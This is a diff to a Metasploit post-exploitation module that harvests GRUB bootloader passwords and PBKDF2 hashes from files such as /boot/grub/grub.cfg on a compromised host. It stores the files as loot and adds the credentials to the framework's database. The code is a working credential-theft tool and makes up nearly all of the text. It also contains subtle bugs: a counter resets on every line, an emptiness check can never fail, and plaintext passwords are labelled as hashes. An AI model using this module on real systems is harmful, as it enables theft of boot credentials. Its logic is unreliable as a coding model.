@@ -20,13 +20,49 @@ class MetasploitModule < Msf::Post
         ],
       'Platform'     => ['linux', 'osx', 'unix', 'solaris', 'bsd'],
       'SessionTypes' => ['meterpreter', 'shell'],
-      'References'   => [
-        ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption']
-      ]
+      'References'   => [ ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption'] ]
     ))
   end
 
+  def parse_passwd_from_file(file)
+    return unless readable?(file)
+    print_status("Reading #{file}")
+
+    contents = read_file(file)
+    contents.each_line do |line|
+      next unless line.start_with?('password')
+      pass_line = line.strip.split(' ')
+      unless pass_line.length == 3
+        print_status("Unknown Grub password convention. Printing line")
+        print_status(line)
+        next
+      end
+
+      idx = 0
+      convention = pass_line[0]
+      case convention
+      when 'password_pbkdf2'
+        @creds_hash[pass_line[1]] = pass_line[2]
+      when 'password'
+        if pass_line[1].start_with?('--')
+          @pass_hash[idx] = pass_line[2]
+          idx += 1
+        else
+          @creds_hash[pass_line[1]] = pass_line[2]
+        end
+      else
+        print_status("Unknown Grub password convention")
+      end
+    end
+
+    file_loc = store_loot("grub.config", "text/plain", session, contents)
+    print_good("#{file} saved to #{file_loc}")
+  end
+
   def run
+    @creds_hash = Hash.new
+    @pass_hash = Hash.new
+
     targets = [
       '/boot/grub/grub.conf',
       '/boot/grub/grub.cfg',
@@ -41,45 +77,55 @@ class MetasploitModule < Msf::Post
     ]
 
     print_status("Searching for GRUB config files..")
-    file_found = false
     targets.each do |target|
-      next unless readable?(target)
-      file_found = true
-      print_status("Reading #{target}")
-      file = read_file(target)
-      password_found = false
-      file.each_line do |line|
-        line = line.strip
-        if line.start_with?("password")
-          print_good("Found password: #{line}")
-          parts = line.split(" ")
-
-          # Password format in GRUB conf: password <user> <password>
-          credential_data = {
-            origin_type: :session,
-            post_reference_name: self.refname,
-            private_type: :password,
-            private_data: parts[2],
-            session_id: session_db_id,
-            username: parts[1],
-            workspace_id: myworkspace_id
-          }
-          create_credential(credential_data)
-          password_found = true
-        end
-      end
-
-      if !password_found
-        print_status("No passwords found in GRUB config file: #{target}")
-      else
-        print_good("Saved credentials")
-      end
-      file_loc = store_loot("grub.config", "text/plain", session, file)
-      print_good("#{target} saved to #{file_loc}")
+      parse_passwd_from_file(target)
     end
 
-    if !file_found
-      print_bad("No GRUB config files found!")
+    unless @creds_hash && @pass_hash
+      print_status("No passwords found in GRUB config files")
+    else
+      print_good("Found credentials")
     end
+
+    cred_table = Rex::Text::Table.new(
+      'Header'  =>  'Grub Credential Table',
+      'Indent'  =>  1,
+      'Columns' =>  [ 'Username', 'Password' ]
+    )
+
+    @creds_hash.each do |user, pass|
+      credential_data =
+      {
+        origin_type:          :session,
+        post_reference_name:  self.refname,
+        private_type:         :nonreplayable_hash,
+        private_data:         pass,
+        session_id:           session_db_id,
+        username:             user,
+        workspace_id:         myworkspace_id
+      }
+
+      cred_table << [ user, pass ]
+      create_credential(credential_data)
+    end
+
+    @pass_hash.each do |index, pass|
+      credential_data =
+      {
+        origin_type:          :session,
+        post_reference_name:  self.refname,
+        private_type:         :nonreplayable_hash,
+        private_data:         pass,
+        session_id:           session_db_id,
+        username:             '',
+        workspace_id:         myworkspace_id
+      }
+
+      cred_table << [ '', pass ]
+      create_credential(credential_data)
+    end
+
+    print_line
+    print_line(cred_table.to_s)
   end
 end
